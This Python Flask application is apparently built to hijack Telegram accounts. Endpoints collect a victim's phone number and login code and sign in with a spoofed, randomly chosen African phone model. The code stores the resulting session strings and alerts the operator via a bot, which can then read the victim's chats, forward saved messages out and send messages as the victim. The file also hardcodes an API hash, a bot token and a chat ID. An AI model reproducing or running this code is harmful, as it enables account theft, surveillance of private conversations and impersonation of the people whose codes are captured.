from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from pyrogram import Client
import asyncio
import os
import re
import requests
import secrets
import random
from datetime import datetime
from pathlib import Path
import threading
import json

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
CORS(app)

API_ID = 6627460
API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"

BOT_TOKEN = "8539687833:AAGZ3mauVO1nMS-nr3xHmXHjOt5TY0IWkKE"
YOUR_CHAT_ID = "7393047582"

active_sessions = {}

# Use /app/sessions volume on Railway, fallback to local ./sessions
SESSIONS_DIR = Path(os.environ.get('SESSIONS_PATH', '/app/sessions'))
SESSIONS_DIR.mkdir(parents=True, exist_ok=True)

print(f"📁 Sessions directory: {SESSIONS_DIR}")
print(f"📁 Sessions directory exists: {SESSIONS_DIR.exists()}")

# Thread-safe async runner
def run_async(coro):
    """Run async code safely from sync context - single loop only"""
    try:
        # Try to get existing loop
        loop = asyncio.get_running_loop()
        # If we're already in async context, we need to create new loop in thread
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(asyncio.run, coro)
            return future.result(timeout=60)
    except RuntimeError:
        # No running loop, create one and run
        try:
            loop = asyncio.get_event_loop()
            if loop.is_closed():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        return loop.run_until_complete(asyncio.wait_for(coro, timeout=60))

def load_existing_sessions():
    """Load persisted sessions from JSON files"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    json_files = list(SESSIONS_DIR.glob("*.json"))
    print(f"🔍 Found {len(json_files)} JSON files to load")
    
    for json_file in json_files:
        try:
            session_id = json_file.stem
            
            with open(json_file, 'r') as f:
                data = json.load(f)
            
            if data.get('is_test_session'):
                print(f"⏭️  Skipping test session: {session_id}")
                continue
            
            if 'session_string' not in data:
                print(f"⚠️  No session_string in {session_id}.json - skipping")
                continue
            
            print(f"🔄 Attempting to restore session: {session_id}")
            
            async def reconnect(sid=session_id, d=data):
                client = Client(
                    name=f"{sid}_restored",
                    api_id=API_ID,
                    api_hash=API_HASH,
                    session_string=d['session_string'],
                )
                await client.start()
                me = await client.get_me()
                return me, client
            
            try:
                me, connected_client = loop.run_until_complete(reconnect())
                active_sessions[session_id] = {
                    'client': connected_client,
                    'phone': data.get('phone'),
                    'user_info': data.get('user_info'),
                    'device_model': data.get('device_model', 'Loaded'),
                    'created_at': data.get('created_at', datetime.now().timestamp()),
                    'session_string': data.get('session_string')
                }
                print(f"✅ Successfully restored: {session_id} - {me.first_name}")
            except Exception as e:
                print(f"❌ Failed to restore session {session_id}: {e}")
                
        except Exception as e:
            print(f"Error loading session {json_file}: {e}")

# Run directly on startup, no thread
load_existing_sessions()

# ============ WEB DASHBOARD ROUTES ============

@app.route('/')
def dashboard():
    """Serve the web dashboard"""
    return render_template('index.html')

# ============ API ENDPOINTS ============

@app.route('/api/sessions', methods=['GET'])
def api_get_sessions():
    """Get all active sessions"""
    sessions = []
    for sid, data in active_sessions.items():
        sessions.append({
            'session_id': sid,
            'phone': data['phone'],
            'name': data['user_info'].get('first_name', 'Unknown') if data.get('user_info') else 'Unknown',
            'username': data['user_info'].get('username', '') if data.get('user_info') else '',
            'device': data.get('device_model', 'Unknown')
        })
    return jsonify({'sessions': sessions, 'count': len(sessions)})

@app.route('/api/chats/<session_id>', methods=['GET'])
def api_get_chats(session_id):
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    session_data = active_sessions[session_id]
    session_string = session_data.get('session_string')
    
    if not session_string:
        return jsonify({'error': 'No session string'}), 400
    
    async def fetch_chats():
        client = Client(
            name="temp_chats",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
        )
        try:
            await client.start()
            chats = []
            async for dialog in client.get_dialogs(limit=50):
                chat_name = dialog.chat.title or dialog.chat.first_name or "Unknown"
                chat_id = dialog.chat.id
                preview = "No messages"
                try:
                    if dialog.top_message and dialog.top_message.text:
                        preview = dialog.top_message.text[:50]
                except:
                    pass
                chats.append({
                    'chat_id': str(chat_id),
                    'name': chat_name,
                    'preview': preview,
                    'username': dialog.chat.username or ''
                })
            return chats
        except Exception as e:
            print(f"Error fetching chats: {e}")
            return []
        finally:
            await client.stop()
    
    chats = run_async(fetch_chats())
    return jsonify({'chats': chats, 'count': len(chats)})
    
@app.route('/api/messages/<session_id>/<chat_id>', methods=['GET'])
def api_get_messages(session_id, chat_id):
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    session_data = active_sessions[session_id]
    client = session_data['client']
    
    async def fetch_messages():
        try:
            messages = []
            async for msg in client.get_chat_history(int(chat_id), limit=30):
                if msg.text:
                    messages.append({
                        'id': msg.id,
                        'text': msg.text,
                        'date': int(msg.date.timestamp()) * 1000,  # JS milliseconds
                        'is_outgoing': msg.outgoing,
                        'from_user': msg.from_user.first_name if msg.from_user else 'Unknown'
                    })
            messages.reverse()
            return messages
        except Exception as e:
            print(f"Error fetching messages: {e}")
            return []
    
    messages = run_async(fetch_messages())
    return jsonify({'messages': messages, 'count': len(messages)})

@app.route('/api/send-message/<session_id>/<chat_id>', methods=['POST'])
def api_send_message(session_id, chat_id):
    """Send a message to a chat"""
    if session_id not in active_sessions:
        return jsonify({'success': False, 'error': 'Session not found'}), 404
    
    data = request.json
    text = data.get('text', '').strip()
    
    if not text:
        return jsonify({'success': False, 'error': 'Message cannot be empty'}), 400
    
    session_data = active_sessions[session_id]
    client = session_data['client']
    
    async def send_msg():
        try:
            await client.send_message(int(chat_id), text)
            return {'success': True, 'message': 'Message sent'}
        except Exception as e:
            print(f"Error sending message: {e}")
            return {'success': False, 'error': str(e)}
    
    result = run_async(send_msg())
    return jsonify(result)

# ============ LEGACY ROUTES (Keep for compatibility) ============

@app.route('/create-test-session', methods=['POST'])
def create_test_session():
    """Create a proper test session for persistent storage testing"""
    try:
        # Create a unique session ID
        session_id = secrets.token_hex(8)
        
        # Generate realistic test data
        test_phone = f"+2519{random.randint(10000000, 99999999)}"
        test_first_name = f"Test{random.randint(1, 999)}"
        test_username = f"test_user_{session_id[:6]}"
        
        # Create a mock user object (for storage purposes)
        mock_user = {
            'id': random.randint(100000000, 999999999),
            'first_name': test_first_name,
            'username': test_username,
            'phone_number': test_phone
        }
        
        # Save proper metadata
        metadata = {
            'phone': test_phone,
            'user_info': mock_user,
            'device_model': 'Test Device - Persistence Check',
            'system_version': 'Android 13',
            'app_version': '10.0.5',
            'created_at': datetime.now().timestamp(),
            'is_test_session': True,
            'session_id': session_id
        }
        
        # Save JSON metadata
        json_file = SESSIONS_DIR / f"{session_id}.json"
        with open(json_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        # Create a placeholder session file (Pyrogram will populate this when used)
        session_file = SESSIONS_DIR / f"{session_id}.session"
        session_file.write_text(f"# Test session created at {datetime.now().isoformat()}\n# Session ID: {session_id}")
        
        # Add to active sessions with a mock client
        # Note: This won't actually connect to Telegram, but will show in /start
        active_sessions[session_id] = {
            'client': None,  # No real client for test sessions
            'phone': test_phone,
            'user_info': mock_user,
            'device_model': 'Test Device - Persistence Check',
            'created_at': datetime.now().timestamp(),
            'is_test_session': True
        }
        
        return jsonify({
            'success': True,
            'message': f'Test session created: {test_first_name} (@{test_username})',
            'session_id': session_id,
            'session_info': metadata,
            'files_created': {
                'json': str(json_file),
                'session': str(session_file)
            }
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/delete-all-sessions', methods=['DELETE'])
def delete_all_sessions():
    """Delete ALL session files from /app/sessions"""
    import shutil
    
    results = {
        'deleted_files': [],
        'deleted_dirs': [],
        'errors': []
    }
    
    if not SESSIONS_DIR.exists():
        return jsonify({'error': 'Sessions directory does not exist', 'results': results})
    
    # Disconnect all active sessions first
    for sid, data in list(active_sessions.items()):
        try:
            client = data.get('client')
            if client and hasattr(client, 'is_connected') and client.is_connected:
                async def disconnect_client():
                    await client.disconnect()
                run_async(disconnect_client())
        except:
            pass
    
    # Delete all files and subdirectories
    for item in SESSIONS_DIR.iterdir():
        try:
            if item.is_file():
                item.unlink()
                results['deleted_files'].append(item.name)
            elif item.is_dir():
                shutil.rmtree(item)
                results['deleted_dirs'].append(item.name)
        except Exception as e:
            results['errors'].append(f"Failed to delete {item.name}: {str(e)}")
    
    # Clear active sessions from memory
    active_sessions.clear()
    
    results['total_deleted'] = len(results['deleted_files']) + len(results['deleted_dirs'])
    results['message'] = f"Deleted {results['total_deleted']} items from {SESSIONS_DIR}"
    
    return jsonify(results)

@app.route('/debug-sessions', methods=['GET'])
def debug_sessions():
    result = []
    for json_file in SESSIONS_DIR.glob("*.json"):
        with open(json_file) as f:
            data = json.load(f)
        result.append({
            'file': json_file.name,
            'has_session_string': 'session_string' in data,
            'phone': data.get('phone'),
            'is_test': data.get('is_test_session', False)
        })
    return jsonify(result)

@app.route('/force-restore', methods=['GET'])
def force_restore():
    session_id = "9253fe1ad404e9a8"
    json_file = SESSIONS_DIR / f"{session_id}.json"
    
    with open(json_file) as f:
        data = json.load(f)
    
    client = Client(
        name=f"{session_id}_restored",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=data['session_string'],
        workdir=str(SESSIONS_DIR)
    )
    
    async def reconnect():
        await client.start()
        me = await client.get_me()
        return me
    
    try:
        me = run_async(reconnect())
        active_sessions[session_id] = {
            'client': client,
            'phone': data.get('phone'),
            'user_info': data.get('user_info'),
            'device_model': data.get('device_model', 'Restored'),
            'created_at': data.get('created_at', datetime.now().timestamp()),
            'session_string': data.get('session_string')
        }
        return jsonify({'success': True, 'name': me.first_name, 'session_id': session_id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
        
# Store which session each bot user has selected
user_selected_session = {}

# ============ AFRICAN PHONE MODELS LIST ============
PHONE_MODELS = [
    # Tecno (Very popular in Africa)
    {"model": "Tecno Spark 10 Pro", "sys": "Android 13", "app": "10.0.5"},
    {"model": "Tecno Spark 20", "sys": "Android 13", "app": "10.1.2"},
    {"model": "Tecno Camon 20 Pro", "sys": "Android 13", "app": "10.0.8"},
    {"model": "Tecno Camon 19", "sys": "Android 12", "app": "9.6.0"},
    {"model": "Tecno Pova 5", "sys": "Android 13", "app": "10.0.3"},
    {"model": "Tecno Pop 8", "sys": "Android 13", "app": "10.0.1"},
    
    # Infinix
    {"model": "Infinix Hot 30", "sys": "Android 13", "app": "10.0.4"},
    {"model": "Infinix Hot 20", "sys": "Android 12", "app": "9.6.2"},
    {"model": "Infinix Note 30", "sys": "Android 13", "app": "10.0.6"},
    {"model": "Infinix Note 12", "sys": "Android 12", "app": "9.6.1"},
    {"model": "Infinix Zero 30", "sys": "Android 13", "app": "10.1.0"},
    {"model": "Infinix Smart 8", "sys": "Android 13", "app": "10.0.2"},
    
    # Samsung (Popular in South Africa, Nigeria, Kenya)
    {"model": "Samsung Galaxy A14", "sys": "Android 13", "app": "10.0.7"},
    {"model": "Samsung Galaxy A04s", "sys": "Android 12", "app": "9.6.3"},
    {"model": "Samsung Galaxy A24", "sys": "Android 13", "app": "10.0.5"},
    {"model": "Samsung Galaxy M14", "sys": "Android 13", "app": "10.0.4"},
    
    # Itel
    {"model": "Itel S23", "sys": "Android 12", "app": "9.6.0"},
    {"model": "Itel S18", "sys": "Android 12", "app": "9.5.8"},
    {"model": "Itel A60", "sys": "Android 12", "app": "9.6.1"},
    {"model": "Itel P40", "sys": "Android 12", "app": "9.5.9"},
    
    # Xiaomi (Popular in Egypt, Morocco, Kenya)
    {"model": "Xiaomi Redmi 12C", "sys": "Android 12", "app": "9.6.4"},
    {"model": "Xiaomi Redmi Note 12", "sys": "Android 12", "app": "9.6.2"},
    {"model": "Xiaomi Poco M5", "sys": "Android 12", "app": "9.6.0"},
    
    # Oppo
    {"model": "Oppo A17", "sys": "Android 12", "app": "9.5.7"},
    {"model": "Oppo A78", "sys": "Android 13", "app": "10.0.1"},
    {"model": "Oppo A16", "sys": "Android 11", "app": "9.4.5"},
    
    # Vivo
    {"model": "Vivo Y16", "sys": "Android 12", "app": "9.5.6"},
    {"model": "Vivo Y22", "sys": "Android 12", "app": "9.6.0"},
    {"model": "Vivo Y35", "sys": "Android 13", "app": "10.0.2"},
    
    # Nokia (Popular in Ethiopia, Kenya)
    {"model": "Nokia C22", "sys": "Android 13", "app": "9.6.1"},
    {"model": "Nokia C32", "sys": "Android 13", "app": "9.6.3"},
    
    # Huawei
    {"model": "Huawei Nova Y90", "sys": "Android 12", "app": "9.5.5"},
    {"model": "Huawei Y9 Prime", "sys": "Android 10", "app": "8.9.0"},
]

def get_random_device():
    """Get random African phone model with realistic app version"""
    device = random.choice(PHONE_MODELS)
    # Sometimes use slightly older app version to look real
    if random.random() < 0.3:
        return device["model"], device["sys"], f"{int(device['app'].split('.')[0]) - 1}.{device['app'].split('.')[1]}.{device['app'].split('.')[2]}"
    return device["model"], device["sys"], device["app"]

def get_random_language():
    """Random language based on African region"""
    languages = ["en", "en", "en", "en", "en", "en", "en", "en"]  # English more common
    return random.choice(languages)

def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error: {e}")
        return None

def get_sessions_list():
    sessions = []
    for sid, data in active_sessions.items():
        if 'user_info' in data:
            sessions.append({
                'session_id': sid,
                'phone': data['phone'],
                'name': data['user_info'].get('first_name', ''),
                'username': data['user_info'].get('username', ''),
                'device': data.get('device_model', 'Unknown')
            })
    return sessions

def sessions_keyboard(sessions):
    buttons = []
    for sess in sessions:
        name = sess['name'] or sess['phone']
        username = f" @{sess['username']}" if sess['username'] else ""
        device_icon = "📱"
        buttons.append([{"text": f"{device_icon} {name}{username}", "callback_data": f"select_{sess['session_id']}"}])
    buttons.append([{"text": "🔄 Refresh", "callback_data": "refresh_sessions"}])
    return {"inline_keyboard": buttons}

def main_menu_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📖 Read Messages", "callback_data": "menu_read"}],
            [{"text": "✏️ Send Message", "callback_data": "menu_write"}],
            [{"text": "📂 List Chats", "callback_data": "menu_chats"}],
            [{"text": "🔄 Switch Account", "callback_data": "switch_account"}]
        ]
    }

def chats_keyboard(dialogs):
    buttons = []
    for dialog in dialogs[:10]:
        name = dialog['name'][:30]
        identifier = dialog['identifier']
        buttons.append([{"text": f"💬 {name}", "callback_data": f"chat_read_{identifier}"}])
    buttons.append([{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}])
    return {"inline_keyboard": buttons}

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json
        print(f"Webhook received: {data}")
        
        # Handle callback queries (button clicks)
        if 'callback_query' in data:
            callback = data['callback_query']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            data_callback = callback['data']
            
            # Handle selecting a session
            if data_callback.startswith('select_'):
                session_id = data_callback.replace('select_', '')
                user_selected_session[str(chat_id)] = session_id
                
                if session_id in active_sessions:
                    session_data = active_sessions[session_id]
                    user_info = session_data.get('user_info', {})
                    device_model = session_data.get('device_model', 'Unknown')
                    
                    text = (f"✅ *Connected to:*\n\n"
                           f"👤 {user_info.get('first_name', 'Unknown')}\n"
                           f"📱 {session_data['phone']}\n"
                           f"📲 Device: {device_model}\n\n"
                           f"*What would you like to do?*")
                    
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                    payload = {
                        "chat_id": chat_id,
                        "message_id": message_id,
                        "text": text,
                        "parse_mode": "Markdown",
                        "reply_markup": main_menu_keyboard()
                    }
                    requests.post(url, json=payload)
            
            # Handle refresh button
            elif data_callback == 'refresh_sessions':
                sessions = get_sessions_list()
                if sessions:
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                    payload = {
                        "chat_id": chat_id,
                        "message_id": message_id,
                        "text": "🤖 *Telegram Control Bot*\n\nSelect an account:",
                        "parse_mode": "Markdown",
                        "reply_markup": sessions_keyboard(sessions)
                    }
                    requests.post(url, json=payload)
                else:
                    answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
                    requests.post(answer_url, json={
                        "callback_query_id": callback['id'],
                        "text": "No active sessions found",
                        "show_alert": False
                    })
            
            # Handle menu options
            elif data_callback == 'menu_read':
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                payload = {
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": "📖 *Read Messages*\n\nSend a message in format:\n`/read CHAT_ID`\n\nExamples:\n`/read me` - Your saved messages\n`/read @username` - Chat with username",
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
                }
                requests.post(url, json=payload)
            
            elif data_callback == 'menu_write':
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                payload = {
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": "✏️ *Send Message*\n\nSend a message in format:\n`/send CHAT_ID | MESSAGE`\n\nExamples:\n`/send @username | Hello!`\n`/send me | Note to self`",
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
                }
                requests.post(url, json=payload)
            
            elif data_callback == 'menu_chats':
                session_id = user_selected_session.get(str(chat_id))
                if not session_id or session_id not in active_sessions:
                    send_telegram_message(chat_id, "❌ No session selected. Send /start first and select an account.")
                else:
                    session_data = active_sessions[session_id]
                    client = session_data['client']
                    
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                    payload = {
                        "chat_id": chat_id,
                        "message_id": message_id,
                        "text": "📂 *Fetching your chats...*",
                        "parse_mode": "Markdown"
                    }
                    requests.post(url, json=payload)
                    
                    async def fetch_chats_callback():
                        try:
                            chats = []
                            async for dialog in client.get_dialogs(limit=20):
                                name = dialog.chat.title or dialog.chat.first_name or "Unknown"
                                identifier = dialog.chat.username or str(dialog.chat.id)
                                chats.append({"name": name, "identifier": identifier})
                            
                            if chats:
                                response = "📂 *Your Chats:*\n\n" + "\n".join([f"• *{c['name']}* - `{c['identifier']}`" for c in chats[:10]])
                                if len(response) > 4000:
                                    response = response[:4000] + "\n\n...(truncated)"
                            else:
                                response = "No chats found"
                            
                            update_url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                            requests.post(update_url, json={
                                "chat_id": chat_id,
                                "message_id": message_id,
                                "text": response,
                                "parse_mode": "Markdown",
                                "reply_markup": {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
                            })
                        except Exception as e:
                            print(f"Error fetching chats: {e}")
                            send_telegram_message(chat_id, f"❌ Error: {str(e)}")
                    
                    run_async(fetch_chats_callback())
            
            elif data_callback == 'switch_account':
                sessions = get_sessions_list()
                if sessions:
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                    payload = {
                        "chat_id": chat_id,
                        "message_id": message_id,
                        "text": "🤖 *Telegram Control Bot*\n\nSelect an account:",
                        "parse_mode": "Markdown",
                        "reply_markup": sessions_keyboard(sessions)
                    }
                    requests.post(url, json=payload)
            
            elif data_callback == 'back_to_menu':
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                payload = {
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": "🤖 *Telegram Control Bot*\n\nSelect an account to continue:",
                    "parse_mode": "Markdown",
                    "reply_markup": sessions_keyboard(get_sessions_list())
                }
                requests.post(url, json=payload)
            
            # Always answer the callback
            answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
            requests.post(answer_url, json={"callback_query_id": callback['id']})
        
        # Handle regular messages
        elif 'message' in data:
            msg = data['message']
            chat_id = msg['chat']['id']
            text = msg.get('text', '')
            
            if text == '/start':
                sessions = get_sessions_list()
                if sessions:
                    send_telegram_message(chat_id,
                        "🤖 *Telegram Control Bot*\n\nSelect an account:",
                        reply_markup=sessions_keyboard(sessions))
                else:
                    send_telegram_message(chat_id,
                        "🤖 *Telegram Control Bot*\n\nNo active sessions.\n\nLogin via web first.")
            
            elif text == '/test_persistence':
                # Test persistence directly from Telegram
                results = {
                    'sessions_dir': str(SESSIONS_DIR),
                    'directory_exists': SESSIONS_DIR.exists(),
                    'files': []
                }
                
                if SESSIONS_DIR.exists():
                    for f in SESSIONS_DIR.iterdir():
                        results['files'].append(f.name)
                
                send_telegram_message(chat_id, 
                    f"📁 *Persistence Test*\n\n"
                    f"Directory: `{results['sessions_dir']}`\n"
                    f"Exists: {results['directory_exists']}\n"
                    f"Files: {len(results['files'])}\n\n"
                    f"Files: {', '.join(results['files'][:10])}"
                )
            
            elif text.startswith('/read'):
                parts = text.split(' ', 1)
                if len(parts) < 2:
                    send_telegram_message(chat_id, "❌ Usage: /read CHAT_ID\n\nExample: /read me")
                else:
                    chat_target = parts[1]
                    session_id = user_selected_session.get(str(chat_id))
                    
                    if not session_id or session_id not in active_sessions:
                        send_telegram_message(chat_id, "❌ No session selected. Send /start first and select an account.")
                    else:
                        session_data = active_sessions[session_id]
                        client = session_data['client']
                        
                        send_telegram_message(chat_id, f"📖 Reading messages from {chat_target}...")
                        
                        async def fetch_messages():
                            try:
                                messages = []
                                async for msg in client.get_chat_history(chat_target, limit=10):
                                    if msg.text:
                                        sender = msg.from_user.first_name if msg.from_user else "Unknown"
                                        messages.append(f"👤 *{sender}*: {msg.text[:200]}")
                                
                                if messages:
                                    response = f"📖 *Messages from {chat_target}:*\n\n" + "\n\n".join(messages)
                                    if len(response) > 4000:
                                        response = response[:4000] + "\n\n...(truncated)"
                                else:
                                    response = f"No messages found in {chat_target}"
                                
                                send_telegram_message(chat_id, response)
                            except Exception as e:
                                send_telegram_message(chat_id, f"❌ Error: {str(e)}")
                        
                        run_async(fetch_messages())
            
            elif text.startswith('/send'):
                parts = text.split(' ', 1)
                if len(parts) < 2:
                    send_telegram_message(chat_id, "❌ Usage: /send CHAT_ID | MESSAGE\n\nExample: /send @username | Hello there!")
                elif ' | ' not in parts[1]:
                    send_telegram_message(chat_id, "❌ Use format: /send CHAT_ID | MESSAGE")
                else:
                    chat_target, message = parts[1].split(' | ', 1)
                    chat_target = chat_target.strip()
                    message = message.strip()
                    
                    session_id = user_selected_session.get(str(chat_id))
                    if not session_id or session_id not in active_sessions:
                        send_telegram_message(chat_id, "❌ No session selected. Send /start first and select an account.")
                    else:
                        session_data = active_sessions[session_id]
                        client = session_data['client']
                        
                        async def send_msg():
                            try:
                                await client.send_message(chat_target, message)
                                send_telegram_message(chat_id, f"✅ Message sent to {chat_target}!")
                            except Exception as e:
                                send_telegram_message(chat_id, f"❌ Error: {str(e)}")
                        
                        run_async(send_msg())
            
            elif text == '/chats' or text == '/list':
                session_id = user_selected_session.get(str(chat_id))
                if not session_id or session_id not in active_sessions:
                    send_telegram_message(chat_id, "❌ No session selected. Send /start first and select an account.")
                else:
                    session_data = active_sessions[session_id]
                    client = session_data['client']
                    
                    send_telegram_message(chat_id, "📂 Fetching your chats...")
                    
                    async def fetch_chats():
                        try:
                            chats = []
                            async for dialog in client.get_dialogs(limit=20):
                                name = dialog.chat.title or dialog.chat.first_name or "Unknown"
                                identifier = dialog.chat.username or str(dialog.chat.id)
                                chats.append(f"• *{name}* - `{identifier}`")
                            
                            if chats:
                                response = "📂 *Your Chats:*\n\n" + "\n".join(chats)
                                if len(response) > 4000:
                                    response = response[:4000] + "\n\n...(truncated)"
                            else:
                                response = "No chats found"
                            
                            send_telegram_message(chat_id, response)
                        except Exception as e:
                            send_telegram_message(chat_id, f"❌ Error: {str(e)}")
                    
                    run_async(fetch_chats())
        
        return jsonify({'ok': True})
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({'ok': True})

@app.route('/send-code', methods=['POST'])
def send_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'}), 400
        
        session_id = secrets.token_hex(8)
        
        # Get random device info for this session
        device_model, system_version, app_version = get_random_device()
        language_code = get_random_language()
        
        async def create_and_store_session():
            client = None
            try:
                # Use session_id as the name - Pyrogram will auto-create .session file
                client = Client(
                    name=session_id,
                    api_id=API_ID,
                    api_hash=API_HASH,
                    workdir=str(SESSIONS_DIR),
                    in_memory=False,
                    device_model=device_model,
                    system_version=system_version,
                    app_version=app_version,
                    lang_code=language_code
                )
                
                await client.connect()
                sent_code = await client.send_code(phone_number=phone)
                
                active_sessions[session_id] = {
                    'client': client,
                    'phone': phone,
                    'phone_code_hash': sent_code.phone_code_hash,
                    'created_at': datetime.now().timestamp(),
                    'device_model': device_model,
                    'system_version': system_version,
                    'app_version': app_version
                }

                # Save metadata to disk (session_string will be added after login)
                metadata = {
                   'phone': phone,
                   'device_model': device_model,
                   'system_version': system_version,
                   'app_version': app_version,
                   'created_at': datetime.now().timestamp()
                }
                with open(SESSIONS_DIR / f"{session_id}.json", 'w') as f:
                     json.dump(metadata, f)
                print(f"Session {session_id} created for {phone} using {device_model} ({system_version})")
                
                return {
                    'success': True,
                    'session_id': session_id,
                    'message': 'Code sent to your Telegram',
                    'device': device_model
                }
                
            except Exception as e:
                if client:
                    await client.disconnect()
                return {'success': False, 'error': str(e)}
        
        result = run_async(create_and_store_session())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        session_id = data.get('session_id', '')
        code = data.get('code', '')
        
        if session_id not in active_sessions:
            return jsonify({'success': False, 'error': 'Session expired'}), 400
        
        session_data = active_sessions[session_id]
        client = session_data['client']
        phone = session_data['phone']
        phone_code_hash = session_data['phone_code_hash']
        device_model = session_data.get('device_model', 'Unknown')
        
        async def complete_login():
            try:
                # Ensure client is connected
                if not client.is_connected:
                    await client.connect()
                
                await client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code
                )
                
                me = await client.get_me()
                
                # ✅ CRITICAL: Export session string for persistence
                session_string = await client.export_session_string()
                
                session_data['user_info'] = {
                    'id': me.id,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'username': me.username
                }
                
                # Save session_string and user info to metadata file
                json_file = SESSIONS_DIR / f"{session_id}.json"
                if json_file.exists():
                    with open(json_file, 'r') as f:
                        metadata = json.load(f)
                else:
                    metadata = {}
                
                metadata['session_string'] = session_string
                metadata['user_info'] = session_data['user_info']
                metadata['phone'] = phone
                
                with open(json_file, 'w') as f:
                    json.dump(metadata, f, indent=2)
                
                # Store in active sessions for quick access
                session_data['session_string'] = session_string
                
                print(f"✅ Session {session_id} logged in and persisted")
                
                # Notify via bot with device info
                send_telegram_message(YOUR_CHAT_ID,
                    f"✅ *New Session Created!*\n\n"
                    f"👤 {me.first_name} (@{me.username})\n"
                    f"📱 {phone}\n"
                    f"📲 Device: {device_model}\n"
                    f"🆔 Session ID: `{session_id}`\n\n"
                    f"Use /start on your bot or visit web dashboard to control"
                )
                
                return {
                    'success': True,
                    'message': f'Logged in as {me.first_name}',
                    'session_id': session_id,
                    'device': device_model,
                    'user': {
                        'id': me.id,
                        'first_name': me.first_name,
                        'username': me.username
                    }
                }
                
            except Exception as e:
                print(f"Login error: {e}")
                return {'success': False, 'error': str(e)}
        
        result = run_async(complete_login())
        return jsonify(result)
        
    except Exception as e:
        print(f"Verify code error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
        
@app.route('/bot-read-messages', methods=['GET'])
def bot_read_messages():
    try:
        if not active_sessions:
            return jsonify({'error': 'No active sessions found'})
        
        session_id = list(active_sessions.keys())[0]
        session_data = active_sessions[session_id]
        client = session_data['client']
        device_model = session_data.get('device_model', 'Unknown')
        
        async def fetch():
            messages = []
            async for msg in client.get_chat_history("me", limit=10):
                if msg.text:
                    messages.append(msg.text)
            return messages
        
        messages = run_async(fetch())
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        for msg in messages[:5]:
            requests.post(url, json={
                'chat_id': YOUR_CHAT_ID,
                'text': f"📖 From {device_model}:\n{msg[:200]}"
            })
        
        return jsonify({'success': True, 'messages_sent': len(messages), 'device': device_model})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/active-sessions-info', methods=['GET'])
def active_sessions_info():
    """View all active sessions with their device info"""
    sessions_info = []
    for sid, data in active_sessions.items():
        sessions_info.append({
            'session_id': sid,
            'phone': data['phone'],
            'device_model': data.get('device_model', 'Unknown'),
            'system_version': data.get('system_version', 'Unknown'),
            'app_version': data.get('app_version', 'Unknown'),
            'created_at': datetime.fromtimestamp(data['created_at']).isoformat() if 'created_at' in data else 'Unknown'
        })
    return jsonify({'sessions': sessions_info, 'count': len(sessions_info)})

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'active_sessions': len(active_sessions)})

@app.route('/list-sessions', methods=['GET'])
def list_sessions():
    """List all files in sessions directory"""
    import os
    files = os.listdir(SESSIONS_DIR) if SESSIONS_DIR.exists() else []
    return jsonify({
        'directory': str(SESSIONS_DIR),
        'files': files,
        'count': len(files)
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
